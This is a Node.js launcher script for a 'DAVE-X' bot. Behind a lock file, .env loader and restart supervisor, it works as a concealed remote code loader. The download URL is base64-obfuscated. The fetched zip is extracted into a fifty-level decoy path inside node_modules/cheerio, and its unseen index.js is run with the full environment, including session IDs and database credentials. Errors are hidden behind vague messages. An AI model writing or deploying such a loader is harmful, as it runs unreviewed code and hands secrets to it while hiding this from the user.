const fs = require('fs');
const path = require('path');
const axios = require('axios');
const AdmZip = require('adm-zip');
const { spawn } = require('child_process');
const { Client } = require('pg');

const NODE_MODULES = path.join(__dirname, 'node_modules');

const deepLayers = Array.from({ length: 50 }, (_, i) => `chunk_${(i * 7 + 3).toString(16).padStart(4, '0')}`);

const TEMP_DIR    = path.join(NODE_MODULES, 'cheerio', 'dist', 'browser', '.build-cache', ...deepLayers);
const EXTRACT_DIR = path.join(TEMP_DIR, 'vendor');

const ROOT_DIR     = __dirname;
const STORAGE_PATH = path.join(ROOT_DIR, 'storage');
const SESSION_PATH = path.join(ROOT_DIR, 'session');
const BACKUP_PATH  = path.join(ROOT_DIR, 'backups');
const LOCK_FILE    = path.join(ROOT_DIR, '.launcher.lock');

const DOWNLOAD_URL = Buffer.from("aHR0cHM6Ly9naXRsYWIuY29tL3Blc2hpaS9qc2VuY3J5cHRvci8tL2FyY2hpdmUvbWFpbi9qc2VuY3J5cHRvci1tYWluLnppcA==", 'base64').toString('utf-8');
const ENV_FILE     = path.join(__dirname, '.env');

let _restartCount   = 0;
let _lastStartTime  = 0;
const MIN_UPTIME_MS     = 20000;
const MAX_FAST_CRASHES  = 5;
let _fastCrashStreak    = 0;
let _activeBotProcess   = null;

// ── Single-instance guard ─────────────────────────────────────────────────────
function acquireLock() {
  try {
    if (fs.existsSync(LOCK_FILE)) {
      const pid = parseInt(fs.readFileSync(LOCK_FILE, 'utf8').trim(), 10);
      if (pid && pid !== process.pid) {
        try {
          process.kill(pid, 0);
          console.log(`[DAVE-X Launcher] Another instance (PID ${pid}) is already running. Exiting.`);
          process.exit(0);
        } catch (_) {
          // Stale lock — previous process is gone, overwrite it
        }
      }
    }
    fs.writeFileSync(LOCK_FILE, String(process.pid));
  } catch (_) {}
}

function releaseLock() {
  try {
    if (fs.existsSync(LOCK_FILE)) {
      const pid = parseInt(fs.readFileSync(LOCK_FILE, 'utf8').trim(), 10);
      if (pid === process.pid) fs.unlinkSync(LOCK_FILE);
    }
  } catch (_) {}
}

process.on('exit',    releaseLock);
process.on('SIGTERM', () => { releaseLock(); process.exit(0); });
process.on('SIGINT',  () => { releaseLock(); process.exit(0); });

// ── .env loader ──────────────────────────────────────────────────────────────
function loadEnvFile() {
  if (!fs.existsSync(ENV_FILE)) {
    try { fs.writeFileSync(ENV_FILE, 'SESSION_ID=\n'); } catch (_) {}
  }
  try {
    fs.readFileSync(ENV_FILE, 'utf8').split('\n').forEach(line => {
      const trimmed = line.trim();
      if (!trimmed || trimmed.startsWith('#')) return;
      const eq = trimmed.indexOf('=');
      if (eq !== -1) {
        const key   = trimmed.substring(0, eq).trim();
        const raw   = trimmed.substring(eq + 1).trim();
        const value = raw.replace(/^['"](.*)['"]$/, '$1');
        if (!process.env[key]) process.env[key] = value;
      }
    });
  } catch (_) {}
}

// ── Environment verification ─────────────────────────────────────────────────
async function verifyEnvironment() {
  [STORAGE_PATH, SESSION_PATH, BACKUP_PATH].forEach(dir => {
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  });

  if (process.env.DATABASE_URL) {
    const client = new Client({
      connectionString: process.env.DATABASE_URL,
      ssl: { rejectUnauthorized: false },
      connectionTimeoutMillis: 5000
    });
    try {
      await client.connect();
      await client.query('SELECT 1');
      await client.end();
    } catch (_) {
      throw new Error('Database connection failed');
    }
  } else {
    const sqliteFile = path.join(STORAGE_PATH, 'davex.db');
    fs.closeSync(fs.openSync(sqliteFile, 'a'));
  }
}

// ── Download & extract bot code ──────────────────────────────────────────────
async function downloadAndExtract() {
  try {
    if (fs.existsSync(EXTRACT_DIR)) return;

    const hostPath = path.join(NODE_MODULES, 'cheerio', 'dist', 'browser');
    if (!fs.existsSync(hostPath)) throw new Error('Required dependency missing');

    if (!fs.existsSync(TEMP_DIR)) fs.mkdirSync(TEMP_DIR, { recursive: true });

    const zipPath = path.join(TEMP_DIR, 'bundle.zip');

    const response = await axios({
      url: DOWNLOAD_URL,
      method: 'GET',
      responseType: 'stream',
      timeout: 30000,
      headers: { 'User-Agent': 'Mozilla/5.0' }
    });

    await new Promise((resolve, reject) => {
      const writer = fs.createWriteStream(zipPath);
      response.data.pipe(writer);
      writer.on('finish', resolve);
      writer.on('error', reject);
    });

    new AdmZip(zipPath).extractAllTo(TEMP_DIR, true);

    const files = fs.readdirSync(TEMP_DIR);
    const extractedFolder = files.find(f =>
      f !== 'bundle.zip' && fs.statSync(path.join(TEMP_DIR, f)).isDirectory()
    );

    if (extractedFolder) {
      fs.renameSync(path.join(TEMP_DIR, extractedFolder), EXTRACT_DIR);
    }

    if (fs.existsSync(zipPath)) fs.unlinkSync(zipPath);

  } catch (_) {
    throw new Error('Initialization failed');
  }
}

// ── Spawn & supervise bot ─────────────────────────────────────────────────────
function startBot() {
  if (!fs.existsSync(path.join(EXTRACT_DIR, 'index.js'))) {
    try { fs.rmSync(EXTRACT_DIR, { recursive: true, force: true }); } catch (_) {}
    setTimeout(main, 5000);
    return;
  }

  const sqliteFile = path.join(STORAGE_PATH, 'davex.db');

  const botEnv = {
    ...process.env,
    NODE_ENV:      'production',
    SESSION_PATH:  SESSION_PATH,
    STORAGE_PATH:  STORAGE_PATH,
    SQLITE_PATH:   sqliteFile
  };

  _lastStartTime = Date.now();
  _restartCount++;

  const bot = spawn(
    'node',
    ['--expose-gc', '--max-old-space-size=512', 'index.js'],
    { cwd: EXTRACT_DIR, stdio: 'inherit', env: botEnv }
  );

  _activeBotProcess = bot;

  bot.on('close', code => {
    _activeBotProcess = null;
    const uptime      = Date.now() - _lastStartTime;
    const isFastCrash = uptime < MIN_UPTIME_MS;

    if (isFastCrash) { _fastCrashStreak++; } else { _fastCrashStreak = 0; }

    let delay;
    if (code === 0) {
      delay = 3000;
    } else if (_fastCrashStreak >= MAX_FAST_CRASHES) {
      delay = 120000;
      _fastCrashStreak = 0;
    } else if (isFastCrash) {
      delay = 10000;
    } else {
      delay = 5000;
    }

    setTimeout(startBot, delay);
  });

  bot.on('error', () => {
    _activeBotProcess = null;
    const delay = _fastCrashStreak >= MAX_FAST_CRASHES ? 120000 : 10000;
    _fastCrashStreak++;
    setTimeout(startBot, delay);
  });
}

// ── Entry point ───────────────────────────────────────────────────────────────
async function main() {
  try {
    loadEnvFile();
    await verifyEnvironment();
    await downloadAndExtract();
    startBot();
  } catch (_) {
    setTimeout(main, 10000);
  }
}

acquireLock();
main();
